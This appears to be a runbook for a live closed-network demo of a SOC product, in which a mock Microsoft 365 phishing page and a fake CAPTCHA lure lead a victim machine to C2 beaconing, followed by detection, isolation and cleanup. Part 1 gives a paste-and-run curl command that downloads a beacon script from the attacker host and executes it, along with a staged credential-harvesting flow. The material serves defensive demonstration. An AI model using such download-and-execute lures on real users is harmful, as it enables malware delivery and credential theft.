# OmniGuard SOC — Live Closed-Network Demo Runbook

This guide walks through the complete **4-Part Live Showcase** on a closed Wi-Fi hotspot (`Koii`):
1. **Part 1 — Baseline (Unprotected Victim):** Full phishing + ClickFix + C2 compromise succeeds.
2. **Part 2 — Ingress Prevention (VerifyEye):** Same phishing portal blocked in-browser + alert sent.
3. **Part 3 — Egress / C2 Detection (SpectraC2 + Live AI):** RMM-Watchdog / C2 beacon caught, correlated on Neo4j, and pushed to Phone.
4. **Part 4 — Investigation, Isolation & Cure (Ask AI + DFIR + One-Click Isolation):** Reverse shell/beacon PID killed, C2 blocked, ledger verified, and host released.

---

## 1. Machine Roles & Network Topology (`Koii` Hotspot)

Connect your **Windows laptop** to **SFBU** (for internet uplink) and turn on **Windows Mobile Hotspot (`Koii`, Band: `Any available`, `WPA2/WPA3`)**. All demo devices join **`Koii`** (`192.168.137.0/24`), bypassing SFBU client isolation while keeping internet active for `ntfy`/Telegram push and `ping 8.8.8.8` isolation checks.

| Role | Machine | What Runs There |
| :--- | :--- | :--- |
| **Hotspot + Attacker / C2 + LLM** | **Windows Laptop** (`192.168.137.1`) | • Windows Mobile Hotspot **`Koii`** (`192.168.137.1/24`)<br>• Ollama (`llama3.2:3b` on `:11434`)<br>• Mock M365 + ClickFix Portal (`:8080`) & C2 Listener (`:9000`)<br>• VirtualBox NAT forwarding `:8000`, `:5173` *(optional `:8100`)* → Debian VM |
| **Analyst / SOC Core** | **Debian VM** *(VirtualBox NAT)* | • MongoDB (`:27017`) + Neo4j (`:7687`)<br>• OmniGuard Backend (`:8000`) + Frontend (`:5173`)<br>• Flipper Zero USB (`demo/flipper_badge_bridge.py`) |
| **Victim Endpoint** | **Teammate Laptop / Raspberry Pi** (`192.168.137.x`) | • Chrome/Edge/Chromium with **VerifyEye Extension**<br>• `demo/run_soc_demo.py --role victim` (Containment & DFIR Agent) |
| **Analyst Mobile** | **Phone** (`192.168.137.x`) | • `ntfy` app (or Telegram) subscribed to alerts<br>• Mobile browser pointed at `http://192.168.137.1:5173` |

### One-Time VirtualBox NAT Port Forwarding (on Windows)
Keep Debian VM on **NAT** (so `10.0.2.2:11434` Ollama works) and open *VM Settings → Network → Adapter 1 → Advanced → Port Forwarding*:
* `SOC-API`: Host Port `8000` → Guest Port `8000`
* `SOC-UI`: Host Port `5173` → Guest Port `5173`
* `VerifyEye` *(optional, if running `verifyeye-agent` container)*: Host Port `8100` → Guest Port `8100`

---

## 2. One-Time Victim Browser Setup (VerifyEye Extension)

On the **Victim machine** (Chrome, Edge, or Chromium):

1. Open `verifyeye-ingress/extension/background.js` and point `CORE` (and `VERIFY`) to the hotspot gateway:
   ```js
   const CORE = "http://192.168.137.1:8000";       // alerts + brands
   const VERIFY = "http://192.168.137.1:8100";      // visual verify agent
   ```
   *(Already pre-configured on the Raspberry Pi at `~/omniguard/verifyeye-ingress/extension/background.js`.)*
2. Open `chrome://extensions` (or `edge://extensions`).
3. Toggle **Developer mode** ON (top right).
4. Click **Load unpacked** and select the `verifyeye-ingress/extension` folder.
5. **Important for Part 1 vs. Part 2:** Leave **"Allow in Incognito"** **OFF**.
   * **Incognito Window** = *Unprotected Victim* (VerifyEye disabled).
   * **Normal Window** = *Protected by VerifyEye*.

---

## 3. Pre-Demo Startup (1 Command per Machine)

### A. Debian VM (Analyst SOC)
1. Ensure Flipper Zero is attached to the VM (*VirtualBox → Devices → USB → Flipper Devices Inc.*) and on its **Home screen**.
2. Launch the SOC stack:
   ```bash
   cd /home/koiisme/code/omniguard
   ./.venv/bin/python demo/run_soc_demo.py
   ```
   *(Add `--ntfy-topic omniguard-demo-soc` for live phone push notifications.)*

### B. Windows Host (Attacker / C2 + Firewall)
Run in **Administrator PowerShell** (pulls latest code, opens `OmniGuard-Demo-Ports` **strictly** for `192.168.137.0/24`, and auto-deletes the rule on `Ctrl+C`):
```powershell
git pull origin feature/full-reference-backup
python demo\run_soc_demo.py --role attacker
```

### C. Victim Machine (Teammate Laptop or Raspberry Pi on `Koii`)
* **On Raspberry Pi (`pi@192.168.137.32`):**
  ```bash
  cd ~/omniguard && sudo -E python3 demo/run_soc_demo.py --role victim --host raspberrypi
  ```
* **On Teammate Linux/Mac Laptop:**
  ```bash
  sudo -E python3 demo/run_soc_demo.py --role victim --host victim-pc
  ```
* **On Teammate Windows Laptop (Admin PowerShell):**
  ```powershell
  python demo\run_soc_demo.py --role victim --host victim-win
  ```
*(Confirm in the OmniGuard dashboard that the Victim host shows **agent online**.)*

### D. Analyst Sign-In (Flipper Zero 1-Tap)
1. Open `http://localhost:5173` on Debian → click **🐬 Flipper Zero / NFC**.
2. Tap your **HID H10301 (`FC: 46, Card: 46966`)** card on the back of the Flipper Zero.
   *(Backup: run **BadUSB → `omniguard_login.txt`** on the Flipper.)*
3. Optional: open the Bell dropdown → click **Phone push → Test →** to verify your phone buzzes before starting.

---

## 4. Live 4-Part Demo Script (~6 Minutes)

### Part 1 — Full Attack Without Protection (~60 sec)
*Goal: Show what happens to a normal user when OmniGuard / VerifyEye is NOT protecting the browser.*

1. On the Victim browser, open an **Incognito** window (VerifyEye is OFF).
2. Navigate to `http://192.168.137.1:8080/login.html` (fake Microsoft 365 portal).
3. Enter test credentials (e.g., `dev@company.com` / `Winter2026!`) and click **Sign in**.
   * **Attacker Terminal (`[portal]`):** Immediately prints `[!] Harvested submission ... email=dev@company.com`.
   * Browser redirects to `http://192.168.137.1:8080/captcha` (Fake CAPTCHA / ClickFix lure).
4. Click **"I am not a robot"** → copies the payload command automatically.
5. Open a Victim terminal, paste (`Ctrl+V` / `Ctrl+Shift+V`), and press **Enter**:
   ```bash
   curl -s http://192.168.137.1:8080/payload/beacon.py -o /tmp/rmm_watchdog_sim.py && python3 /tmp/rmm_watchdog_sim.py
   ```
   * **Attacker Terminal (`[c2]`):** Immediately receives `[RMM-TELEGRAM C2 #1]`, `#2`, `#3` check-ins.
6. *(Press `Ctrl+C` on the Victim's `/tmp/rmm_watchdog_sim.py` terminal before moving to Part 2 if you want a clean slate for Part 3, or leave it running.)*
7. **Talk Track:** *"Without OmniGuard, credentials are stolen in seconds, the user is tricked by a fake CAPTCHA into running an RMM-style C2 implant, and the attacker has live heartbeats."*

---

### Part 2 — Phishing Attack Prevented by VerifyEye (~60 sec)
*Goal: Show VerifyEye stopping the exact same phishing portal at the browser layer.*

1. Switch to the Victim's **Normal** browser window (VerifyEye extension ON).
2. Open `http://192.168.137.1:8080/login.html` and attempt to interact/submit.
3. **What Happens Live:**
   * **VerifyEye Extension** detects the credential form posting off-domain (`evil-c2-collector.net`), blocks the request at the browser/network layer (`declarativeNetRequest`), displays the VerifyEye warning overlay, and posts a `critical` `phishing_page_detected` alert to OmniGuard.
   * On the Debian SOC dashboard, click the new alert (if `verifyeye-agent` is running on `:8100`, show the **VerifyEye Screenshot Evidence** panel).
4. **Talk Track:** *"With VerifyEye enabled, the exact same zero-hour phishing page is blocked before credentials can ever leave the browser, and the SOC gets instant telemetry."*

---

### Part 3 — C2 & RMM-Watchdog Caught by SpectraC2 + Live AI (~90 sec)
*Goal: Show OmniGuard catching covert RMM/Telegram C2 beaconing even if an endpoint executes a payload.*

1. On the Victim terminal, run the ClickFix-downloaded simulator (or use Flipper BadUSB `omniguard_clickfix_demo.txt`):
   ```bash
   python3 /tmp/rmm_watchdog_sim.py
   ```
   *(Or run [`beacon_agent.py`](file:///home/koiisme/code/omniguard/adversary-simulation/c2/beacon_agent.py) with `--mode rmm-watchdog --fast-mode`.)*
2. **What Happens Live:**
   * After 4 heartbeats, the `spectrac2` `rmm_watchdog_c2_beaconing` (`T1219`) alert lands in OmniGuard with both `src_ip` (`192.168.137.x`) and `dst_ip` (`192.168.137.1`).
   * **Neo4j Attack Graph** links the Victim host, source IP, destination C2 IP (`192.168.137.1`), and MITRE technique.
   * **Live AI** automatically reviews the alert, pops a top-right toast proposing **`isolate_host`**, and sends a **Phone Push Notification** (`ntfy`/Telegram).
3. **Talk Track:** *"Even if a user runs a payload outside the browser, SpectraC2 catches the periodic RMM/Telegram C2 traffic, Live AI correlates it on the Attack Graph, and the on-call analyst's phone is alerted immediately."*

---

### Part 4 — AI Investigation, Live DFIR & One-Click Isolation & Cure (~90 sec)
*Goal: Show human-approved investigation, forensic confirmation, real network quarantine, process termination, and recovery.*

1. **Ask AI & AI Transparency:**
   * Click **Ask AI about this alert** (or open Ask AI) and ask: *"Investigate kali-victim and check its DFIR snapshot."*
   * Show the grounded AI explanation + **AI Transparency** (`GET /ai/transparency/logs` records latency, token counts, and tool calls).
2. **Live DFIR Snapshot:**
   * On the Alert Detail view, click **Collect DFIR** → wait ~2s → click **Inspect**.
   * Point out the flagged suspicious process (`rmm_watchdog_sim.py` PID) and active socket to `192.168.137.1:9000`.
3. **One-Click Isolation & Cure:**
   * Click **Quarantine & Kill** (or **Isolate host** → **Confirm isolate**).
   * **What Happens Live:**
     * `containment_agent.py` **kills the `rmm_watchdog_sim.py` PID** on the Victim, blocks internet (`ping 8.8.8.8` times out), and blocks C2 ports `9000,4444,8080` while keeping SOC `:8000` reachable.
     * The Attacker `[c2]` terminal stops receiving heartbeats immediately.
4. **Audit & Release:**
   * Click **Verify Ledger Integrity** (SHA-256 chain verified, including `BADGE_TAP_LOGIN`, `DFIR_SNAPSHOT_COLLECTED`, `NETWORK_ISOLATION_APPLIED`).
   * Click **Release** → Victim's internet (`ping 8.8.8.8`) and firewall rules are cleanly restored.

---

## 5. Clean Teardown & Safety Guarantees
* Press **`Ctrl+C`** in each `run_soc_demo.py` terminal:
  * **Debian SOC:** Stops Backend, Frontend, and Flipper USB bridge cleanly.
  * **Windows Attacker:** Stops Portal & C2 listener and automatically deletes the temporary `OmniGuard-Demo-Ports` Windows Firewall rule.
  * **Victim Agent:** Automatically restores default route / Windows Firewall / `nftables` rules before exiting so the machine is never left offline.
* **Safety:** Zero real malware, zero `msiexec` installs, zero external C2 traffic (`api.telegram.org` is never contacted by the simulator), and `/download/OmniGuardDemoClient.txt` serves a harmless `.txt` stub.
